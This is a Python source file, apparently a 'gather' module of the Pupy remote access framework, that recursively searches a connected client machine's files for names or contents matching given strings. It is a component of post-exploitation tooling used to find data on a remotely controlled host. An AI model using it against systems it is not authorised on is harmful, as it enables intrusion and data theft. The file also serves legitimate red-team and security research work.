# -*- coding: UTF8 -*-
from pupylib.PupyModule import *
import os
from pupylib.utils.term import colorize

__class_name__="SearchModule"

@config(cat="gather")
class SearchModule(PupyModule):
    """ walk through a directory and recursively search a string into files """
    daemon=True
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="search", description=self.__doc__)
        self.arg_parser.add_argument('--path', default='.', help='root path to start (default: current path)')
        self.arg_parser.add_argument('-e','--extensions',metavar='ext1,ext2,...', default= '', help='limit to some extensions')
        self.arg_parser.add_argument('strings', nargs='+', metavar='string', help='strings to search')
        self.arg_parser.add_argument('-m','--max-size', type=int, default=20000000, help='max file size (default 20 Mo)')
        self.arg_parser.add_argument('--content', action='store_true', help='check inside files (such as grep)')

    def run(self, args):
        self.client.load_package("pupyutils.search", force=True)
        self.client.load_package("scandir")
  
        if args.extensions:
            args.extensions = tuple(f.strip() for f in args.extensions.split(','))
        # if not extension is provided for find commad, try to extract it to gain time during the research
        elif not args.content:
            args.extensions = tuple(os.path.splitext(s)[1].strip() for s in args.strings)    

        search_str = [s.lower() for s in args.strings]

        s = self.client.conn.modules['pupyutils.search'].Search(files_extensions=args.extensions, max_size=args.max_size, check_content=args.content, root_path=args.path, search_str=search_str)
        self.info("searching strings %s in %s ..."%(args.strings, args.path))
        for res in s.run():
            # add color
            for s in search_str:
                if s in res:
                    res = res.replace(s, colorize(s,"green"))
            self.success("%s" % res)
        self.info("search finished !")